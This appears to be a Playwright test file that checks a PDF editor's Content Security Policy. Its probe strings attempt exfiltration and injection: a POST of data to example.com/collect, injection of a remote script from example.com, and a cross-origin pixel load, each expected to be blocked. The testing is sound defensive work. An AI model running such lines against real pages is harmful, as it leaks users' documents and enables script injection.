import { type Page, expect, test } from "@playwright/test";
import { FLAT_BOXES, buildFlatCheckboxPdf } from "../fixtures";
import { centerOf, openPdf, savePdf, viewportPoint } from "./harness";

/** Collects policy violations from before the first script runs, so nothing is missed. */
async function watchViolations(page: Page): Promise<void> {
  await page.addInitScript(() => {
    (window as { violations?: string[] }).violations = [];
    document.addEventListener("securitypolicyviolation", event =>
      (window as { violations?: string[] }).violations!.push(`${event.violatedDirective} ${event.blockedURI}`),
    );
  });
}

function violationsOf(page: Page): Promise<string[]> {
  return page.evaluate(() => (window as { violations?: string[] }).violations ?? []);
}

/** Browsers name the element-level directive when there is one, so compare on the family. */
function family(directive: string): string {
  return directive.replace(/-(elem|attr)$/, "");
}

/**
 * Whichever directive stopped the attempt, or "none" if nothing did. The body is compiled by the
 * debugger, which the page's policy does not govern — so what these probes weigh is the fetch or
 * the load the body goes on to make, never the compiling of it.
 */
function attempt(page: Page, reach: string): Promise<string> {
  return page.evaluate(
    body =>
      new Promise<string>(resolve => {
        document.addEventListener("securitypolicyviolation", event => resolve(event.violatedDirective), { once: true });
        // eslint-disable-next-line no-new-func
        new Function(body)();
        setTimeout(() => resolve("none"), 1500);
      }),
    reach,
  );
}

test("a whole edit session raises no policy violations", async ({ page }) => {
  await watchViolations(page);
  const crashes: string[] = [];
  page.on("pageerror", error => crashes.push(error.message));

  await openPdf(page, await buildFlatCheckboxPdf());
  const box = await viewportPoint(page, centerOf(FLAT_BOXES[0]!));
  await page.mouse.click(box.x, box.y);
  await page.locator('[data-tool="draw"]').click();
  const from = await viewportPoint(page, { x: 210, y: 420 });
  const to = await viewportPoint(page, { x: 380, y: 420 });
  await page.mouse.move(from.x, from.y);
  await page.mouse.down();
  await page.mouse.move(to.x, to.y, { steps: 10 });
  await page.mouse.up();
  await page.locator('[data-tool="text"]').click();
  const caret = await viewportPoint(page, { x: 200, y: 500 });
  await page.mouse.click(caret.x, caret.y);
  await page.locator('[data-testid="text-input"]').waitFor();
  await page.keyboard.type("Paid in full");
  await page.keyboard.press("Enter");
  const saved = await savePdf(page);

  expect(saved.length).toBeGreaterThan(0);
  expect(await violationsOf(page)).toEqual([]);
  expect(crashes).toEqual([]);
});

test("the page cannot send an opened document to another origin", async ({ page }) => {
  await page.goto("/");
  const stopped = await attempt(page, "fetch('https://example.com/collect', { method: 'POST', body: 'x' })");
  expect(family(stopped)).toBe("connect-src");
});

test("the page will not run script fetched from another origin", async ({ page }) => {
  await page.goto("/");
  const injected = "const s = document.createElement('script'); s.src = 'https://example.com/x.js'; document.head.append(s)";
  expect(family(await attempt(page, injected))).toBe("script-src");
});

test("the page will not load an image from another origin", async ({ page }) => {
  await page.goto("/");
  const stopped = await attempt(page, "const i = new Image(); i.src = 'https://example.com/pixel.png'; document.body.append(i)");
  expect(family(stopped)).toBe("img-src");
});

test("a path the editor does not have is not served the editor", async ({ page }) => {
  const response = await page.request.get("/wp-admin");
  expect(response.status()).toBe(404);
  expect(response.headers()["content-type"]).toContain("text/plain");
  expect(await response.text()).not.toContain("<html");
});

test("the policy leaves script no way in but this origin", async ({ page }) => {
  await page.goto("/");
  const policy = await page.evaluate(
    () => document.querySelector('meta[http-equiv="Content-Security-Policy" i]')?.getAttribute("content") ?? "",
  );
  const directive = policy.split(";").map(part => part.trim()).find(part => part.startsWith("script-src"));
  expect(directive).toBe("script-src 'self'");
  expect(policy).toContain("default-src 'none'");
});

test("script written into the page does not run", async ({ page }) => {
  await watchViolations(page);
  await page.goto("/");

  const ran = await page.evaluate(() => {
    const script = document.createElement("script");
    script.textContent = "window.__ran = true";
    document.head.append(script);
    return (window as { __ran?: boolean }).__ran === true;
  });

  expect(ran).toBe(false);
  expect((await violationsOf(page)).some(reported => reported.startsWith("script-src"))).toBe(true);
});
